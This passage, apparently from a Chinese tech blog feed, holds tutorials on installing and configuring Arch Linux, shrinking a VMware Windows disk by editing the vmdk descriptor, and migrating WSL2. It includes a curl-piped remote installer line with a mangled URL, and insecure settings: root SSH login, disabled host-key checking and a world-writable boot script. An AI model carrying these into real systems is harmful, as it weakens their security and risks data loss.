class="comment"># 生成 fstab 文件并检查</span></span><br><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br><span class="line"><span class="built_in">cat</span> /mnt/etc/fstab</span><br><span class="line"><span class="comment"># 切换系统目录</span></span><br><span class="line">arch-chroot /mnt</span><br><span class="line"><span class="comment"># 更改时区，设置UTC</span></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">hwclock --systohc --utc</span><br><span class="line"><span class="comment"># 更改local并生成locale信息</span></span><br><span class="line">vim /etc/locale.gen</span><br><span class="line"><span class="comment"># 找到合适的地区去掉前面的#</span></span><br><span class="line">locale-gen</span><br><span class="line"><span class="comment"># 将语言信息写入locale.conf</span></span><br><span class="line"><span class="built_in">echo</span> LANG=en_GB.UTF-8 &gt; /etc/locale.conf</span><br><span class="line"><span class="comment"># 配置网络</span></span><br><span class="line">vim /etc/hostname</span><br><span class="line">----</span><br><span class="line">archlinux</span><br><span class="line"><span class="comment"># 直接写入自己的主机名</span></span><br><span class="line">vim /etc/hosts</span><br><span class="line">----</span><br><span class="line">127.0.0.1   localhost</span><br><span class="line">::1         localhost</span><br><span class="line">127.0.1.1   archlinux.localdomain archlinux</span><br><span class="line"><span class="comment"># archlinux就是自己的主机名</span></span><br><span class="line"><span class="comment"># 安装相关包</span></span><br><span class="line">pacman -S grub efibootmgr efivar networkmanager intel-ucode</span><br><span class="line"><span class="comment"># 配置grub</span></span><br><span class="line">grub-install /dev/sda</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br><span class="line"><span class="comment"># 激活并启用NetworkManager</span></span><br><span class="line">systemctl <span class="built_in">enable</span> NetworkManager</span><br><span class="line"><span class="comment"># 更改密码</span></span><br><span class="line">passwd</span><br><span class="line"><span class="comment"># 卸载挂载，重启</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">umount /mnt/boot/EFI</span><br><span class="line">umount /mnt</span><br><span class="line">reboot </span><br></pre></td></tr></tbody></table></figure><h1 id="安装后"><a class="anchor" href="#安装后">#</a> 安装后</h1><figure class="highlight bash"><figcaption><span>bash</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置网络，再次联网</span></span><br><span class="line"><span class="comment"># 输入nmtui 选择 “Activate a connection” 回车进入，选择你需要的网络，连接后back返回即可</span></span><br><span class="line"><span class="comment"># 安装 openssh</span></span><br><span class="line">pacman -S openssh</span><br><span class="line">systemctl <span class="built_in">enable</span> sshd</span><br><span class="line">systemctl start sshd</span><br><span class="line">systemctl status sshd</span><br><span class="line"><span class="comment"># 查看ip</span></span><br><span class="line">ip -brief address / addr</span><br><span class="line"><span class="comment"># 修改ssh配置允许root连接</span></span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">----</span><br><span class="line"><span class="comment"># 将下列的语句值改为yes</span></span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line"><span class="comment"># 重启ssh</span></span><br><span class="line">systemctl restart sshd</span><br><span class="line"><span class="comment"># 使用ssh连接</span></span><br><span class="line">ssh -o StrictHostKeyChecking=no root@192.168.204.130</span><br><span class="line"><span class="comment"># 更新</span></span><br><span class="line">pacman -Syu</span><br><span class="line">useradd axro</span><br><span class="line">vi /etc/passwd</span><br><span class="line">---</span><br></pre></td></tr></tbody></table></figure><h1 id="优化终端"><a class="anchor" href="#优化终端">#</a> 优化终端</h1><figure class="highlight bash"><figcaption><span>bash</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装zsh，高亮，补全</span></span><br><span class="line">sudo pacman -S zsh</span><br><span class="line">sudo pacman -S zsh-autosuggestions</span><br><span class="line">sudo pacman -S zsh-syntax-highlighting</span><br><span class="line"><span class="comment"># 安装git</span></span><br><span class="line">sudo pacman -S git</span><br><span class="line"><span class="comment"># 使用以下命令配置zsh</span></span><br><span class="line"><span class="built_in">autoload</span> -Uz zsh-newuser-install</span><br><span class="line">zsh-newuser-install -f</span><br><span class="line"><span class="comment"># 查看是否生成.zshrc</span></span><br><span class="line"><span class="built_in">ls</span> -a</span><br><span class="line"><span class="comment"># 安装oh my zsh</span></span><br><span class="line">sh -c <span class="string">"<span class="subst">$(curl -fsSL https:#raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>"</span></span><br><span class="line"><span class="comment"># 在.zshrc中加入以下插件</span></span><br><span class="line">vim .zshrc</span><br><span class="line">---</span><br><span class="line">ZSH_THEME=<span class="string">"dieter"</span></span><br><span class="line"><span class="built_in">alias</span> vi=vim</span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">'ls -l'</span></span><br><span class="line"><span class="built_in">source</span> /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</span><br><span class="line"><span class="built_in">source</span> /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br><span class="line">:wq</span><br><span class="line"><span class="comment"># 刷新终端</span></span><br><span class="line"><span class="built_in">source</span> .zshrc</span><br><span class="line"><span class="comment"># 安装neofetch</span></span><br><span class="line">sudo pacman -S neofetch</span><br><span class="line">---</span><br><span class="line">11:18:08 axro@axro-arch ~ neofetch</span><br><span class="line">                   -`                    axro@axro-arch</span><br><span class="line">                  .o+`                   --------------</span><br><span class="line">                 `ooo/                   OS: Arch Linux x86_64</span><br><span class="line">                `+oooo:                  Host: VMware20,1 None</span><br><span class="line">               `+oooooo:                 Kernel: 6.2.2-arch1-1</span><br><span class="line">               -+oooooo+:                Uptime: 20 mins</span><br><span class="line">             `/:-:++oooo+:               Packages: 182 (pacman)</span><br><span class="line">            `/++++/+++++++:              Shell: zsh 5.9</span><br><span class="line">           `/++++++++++++++:             Resolution: 1280x800</span><br><span class="line">          `/+++ooooooooooooo/`           Terminal: /dev/pts/0</span><br><span class="line">         ./ooosssso++osssssso+`          CPU: 11th Gen Intel i7-11800H (1) @ 2.304GHz</span><br><span class="line">        .oossssso-````/ossssss+`         GPU: 00:0f.0 VMware SVGA II Adapter</span><br><span class="line">       -osssssso.      :ssssssso.        Memory: 209MiB / 3883MiB</span><br><span class="line">      :osssssss/        osssso+++.</span><br><span class="line">     /ossssssss/        +ssssooo/-</span><br><span class="line">   `/ossssso+/:-        -:/+osssso+-</span><br><span class="line">  `+sso+:-`                 `.-/+oso:</span><br><span class="line"> `++:.                           `-/+/</span><br><span class="line"> .`                                 `/</span><br><span class="line"></span><br><span class="line">11:21:14 axro@axro-arch ~</span><br></pre></td></tr></tbody></table></figure><h1 id="安装桌面环境"><a class="anchor" href="#安装桌面环境">#</a> 安装桌面环境</h1><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装xorg-server，xorg-xinit</span></span><br><span class="line">sudo pacman -S xorg-server xorg-xinit</span><br><span class="line"><span class="comment"># 安装显卡驱动</span></span><br><span class="line">sudo pacman -S xf86-video-vesa <span class="comment"># 这里使用的是vmware，请自行找适合自己机器的显卡驱动</span></span><br><span class="line"><span class="comment"># 安装plasma</span></span><br><span class="line">sudo pacman -S pacman-meta konsole dolphin</span><br><span class="line">sudo pacman -S kde-applications-meta sddm</span><br><span class="line"><span class="comment"># 启动kde plasma</span></span><br><span class="line">sudo systemctl start sddm.service</span><br><span class="line"><span class="comment"># 安装字体，更改中文</span></span><br><span class="line">sudo pacman -S noto-fonts-cjk wqy-microhei</span><br><span class="line"><span class="comment"># 安装火狐浏览器</span></span><br><span class="line">sudo pacman -S firefox</span><br><span class="line"><span class="comment"># 使用如下命令打开和关闭网卡</span></span><br><span class="line">ifconfig ens160 down/up</span><br></pre></td></tr></tbody></table></figure><h2 id="vmware安装vmwaretools-实现窗口分辨率自适应"><a class="anchor" href="#vmware安装vmwaretools-实现窗口分辨率自适应">#</a> vmware 安装 vmwaretools 实现窗口分辨率自适应。</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">sudo pacman -Sy gtkmm gtkmm3 net-tools open-vm-tools xf86-video-vmware xf86-input-vmmouse</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> vmtoolsd.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> vmware-vmblock-fuse.service</span><br><span class="line">sudo reboot</span><br></pre></td></tr></tbody></table></figure><h3 id="详细请参考"><a class="anchor" href="#详细请参考">#</a> 详细请参考</h3><p><a href="https://wiki.archlinuxcn.org/wiki/VMware/%E5%AE%89%E8%A3%85_Arch_Linux_%E4%B8%BA%E8%99%9A%E6%8B%9F%E6%9C%BA">wiki.archlinuxcn.org</a><br> 这里不多赘述。</p><h2 id="安装中文输入法"><a class="anchor" href="#安装中文输入法">#</a> 安装中文输入法</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 安装fcitx5</span><br><span class="line">sudo pacman -S fcitx5-im fcitx5-chinese-addons  fcitx5-rime fcitx5-configtool</span><br><span class="line">// 编辑配置文件</span><br><span class="line">vi /etc/environment</span><br><span class="line">---</span><br><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line">SDL_IM_MODULE=fcitx</span><br><span class="line"></span><br><span class="line">// 重启，gnome和kde会自动配置</span><br><span class="line">reboot</span><br></pre></td></tr></tbody></table></figure><h2 id="安装yay工具并安装linuxqq"><a class="anchor" href="#安装yay工具并安装linuxqq">#</a> 安装 yay 工具并安装 linuxqq</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://aur.archlinux.org/yay.git</span><br><span class="line"><span class="built_in">cd</span> yay</span><br><span class="line">makepkg -si</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="编写rclocal"><a class="anchor" href="#编写rclocal">#</a> 编写 rc.local</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/lib/systemd/system/rc-local.service</span><br><span class="line">---</span><br><span class="line">#/usr/lib/systemd/system/rc-local.service</span><br><span class="line">[Unit]</span><br><span class="line">Description="写下描述" </span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/etc/rc.local start #在这里你可以看到开机执行脚本的位置</span><br><span class="line">TimeoutSec=0</span><br><span class="line">StandardInput=tty</span><br><span class="line">RemainAfterExit=yes</span><br><span class="line">SysVStartPriority=99</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">vi /etc/rc.local</span><br><span class="line">---</span><br><span class="line">#/bin/bash</span><br><span class="line">sudo pacman -Syu</span><br><span class="line">exit 0</span><br><span class="line"></span><br><span class="line">chmod 777 /etc/rc.local</span><br><span class="line">systemctl enable rc.local.service</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> arch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> arch </tag>
            
            <tag> pacman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手动回收VMware中Windows系虚拟机的磁盘占用</title>
      <link href="/ug/174137/"/>
      <url>/ug/174137/</url>
      
        <content type="html"><![CDATA[<p>通常在我们创建虚拟机时往往并不清楚需要多少空间，等到后期才会发现分配了很多空间实际上用不到。这时候就要想办法缩小虚拟机所占用的空间了。<br>根据我这次缩小空间的经历，我十分不推荐使用快照功能。因为这会让你虚拟机当前处在快照模式，与原来的文件关系不大（就是处理起来更麻烦了。）。<br>如果你像我一样只是用 vmware 来存放如企鹅，钉钉，腾讯会议，微信这种垃圾的话，那么可以参照我的方法。</p><h1 id="缩小空间占用"><a class="anchor" href="#缩小空间占用">#</a> 缩小空间占用。</h1><h2 id="0首先查看磁盘类型"><a class="anchor" href="#0首先查看磁盘类型">#</a> 0. 首先查看磁盘类型</h2><p>使用文本编辑器打开虚拟机根目录下的 xxx.vmdk 文件，查看 # Extent description 下面的内容第三块是否为 SPARSE 。不是则需要进行转换。如下图：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s001.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s002.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s003.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s004.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s005.vmdk"</span><br><span class="line">RW 4521984 SPARSE "Windows 7 x64-cl1-s006.vmdk"</span><br></pre></td></tr></tbody></table></figure><p>如果你在创建虚拟机选择的是动态分配磁盘文件并拆分成多个的话这里就是 SPARSE。</p><h2 id="1确保没有快照"><a class="anchor" href="#1确保没有快照">#</a> 1. 确保没有快照</h2><p>确保虚拟机内没有快照。虚拟机目录下只有一个 xxx.vmdk 以及从属的 s00x.vmdk。如果有快照没法处理，则可以执行克隆操作到其他盘进行处理。</p><h2 id="2尽可能缩小虚拟机内部所占用的空间"><a class="anchor" href="#2尽可能缩小虚拟机内部所占用的空间">#</a> 2. 尽可能缩小虚拟机内部所占用的空间</h2><blockquote><p>参考<a href="https://blog.csdn.net/CoutCodes/article/details/104975783">【Win10 C 盘压缩卷问题解答】：无法将卷压缩到超出任何不可移动的文件所在点</a></p></blockquote><p>进入虚拟机，进行以下处理：</p><ul><li>关闭休眠功能 *</li><li>关闭虚拟内存并删除虚拟内存文件 *</li><li>虚拟机内进行空间整理，磁盘清理</li><li>处理其他文件</li></ul><p>注意后面带星号的处理完成所有步骤后要重新打开 (建议)，不然可能会影响性能。</p><p>此时你需要确定你缩小后的 c 盘空间大小，这也决定着后面动态磁盘缩小的操作。我确定缩小后的空间为 22GiB。</p><h2 id="3-重启到pe系统使用diskgenius缩小c盘空间"><a class="anchor" href="#3-重启到pe系统使用diskgenius缩小c盘空间">#</a> 3. 重启到 pe 系统使用 Diskgenius 缩小 c 盘空间。</h2><h3 id="使用微pe制作iso文件"><a class="anchor" href="#使用微pe制作iso文件">#</a> 使用微 pe 制作 iso 文件</h3><ol><li>打开</li></ol><h3 id="添加硬件cddvd设备使用创建的iso文件"><a class="anchor" href="#添加硬件cddvd设备使用创建的iso文件">#</a> 添加硬件 CD/DVD 设备，使用创建的 iso 文件。</h3><h3 id="vmware设置光驱启动"><a class="anchor" href="#vmware设置光驱启动">#</a> <a href="https://blog.csdn.net/syf442/article/details/5067832">VMWare 设置光驱启动</a></h3><h2 id="4-减小vmware虚拟机虚拟磁盘大小"><a class="anchor" href="#4-减小vmware虚拟机虚拟磁盘大小">#</a> 4. 减小 VMware 虚拟机虚拟磁盘大小</h2><blockquote><p>此处内容来自：<a href="https://blog.csdn.net/HayPinF/article/details/108252631">减小 VMware 虚拟机虚拟磁盘大小</a></p></blockquote><p>在 VMware 里虚拟机的所有编号了的  <code>.*s001.*.vmdk</code>  片段虚拟磁盘文件是虚拟化的虚拟机最大空间（Maximum Size)，就比如我的 Win7 虚拟机的 Maximum Size 是 40GiB（1GiB=1024MiB，1GB=1000MB），虚拟机生成了  <code>.*s001~s011.vmdk</code>  共 11 个虚拟机磁盘文件 vmdk，该虚拟机的 "Windows 7 x64-cl1.vmdk" 中详实记录了这 11 个 vmdk 文件（从而进行各分片虚拟磁盘文件的按名索引）：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Extent description</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s001.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s002.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s003.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s004.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s005.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s006.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s007.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s008.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s009.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s010.vmdk"</span><br><span class="line">RW 655360 SPARSE "Windows 7 x64-cl1-s011.vmdk"</span><br></pre></td></tr></tbody></table></figure><p>vmdk 文件的 "8323072" 数字表示簇，2 簇 = 1KiB，则这 11 个 vmdk 文件对应了 ((10×8323072)/2/1024/1024)+(655360/2/1024/1024)=10×3.96875GiB+0.3125Gib=40GiB，刚好。</p><p>我们所要做的就是通过改变这里的文件个数从而达到缩小 vmdk 磁盘大小的目的。<br>已知 40GiB 对应的簇大小为 10×8323072+655360=83886080。即一个 G 的簇大小为 2097152 (/2=1048576)。<br>我们确定一下自己压缩后的大小。就比如我要压缩到 22G，得出簇的总大小为 2097152×22=46137344，这个数可以拆为五个 8323072 加上一个 46137344-(8323072×5)=4521984。即 (8323072×5)+4521984=46137344。<br>因此上面的文件就可以改成下面这样：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Extent description</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s001.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s002.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s003.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s004.vmdk"</span><br><span class="line">RW 8323072 SPARSE "Windows 7 x64-cl1-s005.vmdk"</span><br><span class="line">RW 4521984 SPARSE "Windows 7 x64-cl1-s006.vmdk"</span><br></pre></td></tr></tbody></table></figure><p>记得备份 "Windows 7 x64-cl1.vmdk"，处理完成保存即可。</p><h2 id="5重新启动虚拟机"><a class="anchor" href="#5重新启动虚拟机">#</a> 5. 重新启动虚拟机</h2><p>此时你会发现虚拟机的磁盘大小已经变成 22G 了。教程结束。</p>]]></content>
      
      
      
        <tags>
            
            <tag> vmware </tag>
            
            <tag> win7 </tag>
            
            <tag> capacity </tag>
            
            <tag> shrink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSL2迁移以及空间回收。</title>
      <link href="/ug/082913/"/>
      <url>/ug/082913/</url>
      
        <content type="html"><![CDATA[<div class="tag-plugin image"><div class="image-bg"><img src="../img/wsl2move/20221119083153.png" fancybox="true"></div></div>  <h1 id="intro"><a class="anchor" href="#intro">#</a> Intro</h1><p>如果你按照正常方式在设置里移动 wsl 的话就会发现报错，本篇文章向您介绍如何正确迁移以及回收空间。</p><h1 id="移动"><a class="anchor" href="#移动">#</a> 移动</h1><p>在 Windows 的 PowerShell 中输入:</p><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --<span class="built_in">help</span></span><br></pre></td></tr></tbody></table></figure><p>可以看到关于这个命令的使用帮助说明：</p><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">用法: wsl.exe [参数] [选项...] [命令行]</span><br><span class="line"> </span><br><span class="line">用于运行 Linux 二进制文件的参数:</span><br><span class="line"> </span><br><span class="line">    如果未提供命令行，wsl.exe 将启动默认的 shell。</span><br><span class="line">    --exec, -e &lt;命令行&gt;</span><br><span class="line">        执行指定的命令而不使用默认的 Linux shell。</span><br><span class="line">    --</span><br><span class="line">        按原样传递剩余的命令行。</span><br><span class="line">选项:</span><br><span class="line">    --distribution, -d &lt;分发版&gt;</span><br><span class="line">        运行指定的分发。</span><br><span class="line">    --user, -u &lt;用户名&gt;</span><br><span class="line">        以指定用户身份运行。</span><br><span class="line">用于管理适用于 Linux 的 Windows 子系统的参数:</span><br><span class="line"> </span><br><span class="line">    --export &lt;分发版&gt; &lt;文件名&gt;</span><br><span class="line">        将分发导出到 tar 文件。</span><br><span class="line">        对于标准输出，文件名可以是 -。</span><br><span class="line">    --import &lt;分发版&gt; &lt;安装位置&gt; &lt;文件名&gt; [选项]</span><br><span class="line">        将指定的 tar 文件作为新分发进行导入。</span><br><span class="line">        对于标准输入，文件名可以是 -。</span><br><span class="line">        选项:</span><br><span class="line">            --version &lt;版本&gt;</span><br><span class="line">                指定用于新分发的版本。</span><br><span class="line">    --list, -l [选项]</span><br><span class="line">        列出分发。</span><br><span class="line">        选项:</span><br><span class="line">            --all</span><br><span class="line">                列出所有分发，包括当前正在</span><br><span class="line">                安装或卸载的分发。</span><br><span class="line">            --running</span><br><span class="line">                只列出当前正在运行的分发。</span><br><span class="line">            --quiet, -q</span><br><span class="line">                只显示分发名称。</span><br><span class="line">            --verbose, -v</span><br><span class="line">                显示有关所有分发的详细信息。</span><br><span class="line">    --<span class="built_in">set</span>-default, -s &lt;分发版&gt;</span><br><span class="line">        将分发设置为默认值。</span><br><span class="line">    --<span class="built_in">set</span>-default-version &lt;版本&gt;</span><br><span class="line">        更改新分发的默认安装版本。</span><br><span class="line">    --<span class="built_in">set</span>-version &lt;分发版&gt; &lt;版本&gt;</span><br><span class="line">        更改指定分发的版本。</span><br><span class="line">    --shutdown</span><br><span class="line">        立即终止所有正在运行的分发和 WSL <span class="number">2</span> 轻型工具虚拟机。</span><br><span class="line">    --terminate, -t &lt;分发版&gt;</span><br><span class="line">        终止指定的分发。</span><br><span class="line">    --unregister &lt;分发版&gt;</span><br><span class="line">        注销分发。</span><br><span class="line">    --<span class="built_in">help</span></span><br><span class="line">        显示用法信息。</span><br></pre></td></tr></tbody></table></figure><p>这里我们使用到 export 、unregister 和 import 几个选项就可以实现迁移。</p><ol><li>终止正在运行的分发或虚拟机：<figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></tbody></table></figure></li><li>查看已安装的 wsl 名称：<figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl.exe --list --all</span><br></pre></td></tr></tbody></table></figure><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">适用于 Linux 的 Windows 子系统分发:</span><br><span class="line">Debian (默认)</span><br><span class="line">kali-linux</span><br><span class="line">Ubuntu</span><br></pre></td></tr></tbody></table></figure></li><li>对需要迁移的分发或虚拟机导出（我要迁移 kali-linux）：<figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --export kali-linux D:\kali</span><br></pre></td></tr></tbody></table></figure></li><li>卸载分发版或虚拟机（如果是要重装系统或换机器安装，这一步可以省略，但是要将上一步导出的文件保存好）<figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --unregister kali-linux</span><br></pre></td></tr></tbody></table></figure></li><li>导入新的分发版或虚拟机：<figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --import kali-linux D:\wsl\kali D:\kali</span><br></pre></td></tr></tbody></table></figure></li></ol><h1 id="压缩"><a class="anchor" href="#压缩">#</a> 压缩</h1><p>等待导入后你会发现移动的其实是 vhdx 文件，那么就可以对这个文件进行回收空间。</p><ol><li>以管理员身份运行 cmd，输入 diskpart 命令按回车。</li><li>使用以下命令选择你的 userdata.vhdx</li></ol><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select vdisk file = "D:\wsl\ext4.vhdx"</span><br></pre></td></tr></tbody></table></figure><p>如果提示</p><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DiskPart successfully selected the virtual disk file.</span><br></pre></td></tr></tbody></table></figure><p>就说明成功了。</p><ol start="3"><li>输入  <code>compact vdisk</code>  来压缩。</li></ol><h1 id="bug"><a class="anchor" href="#bug">#</a> bug</h1><figure class="highlight cmd"><figcaption><span>cmd</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span 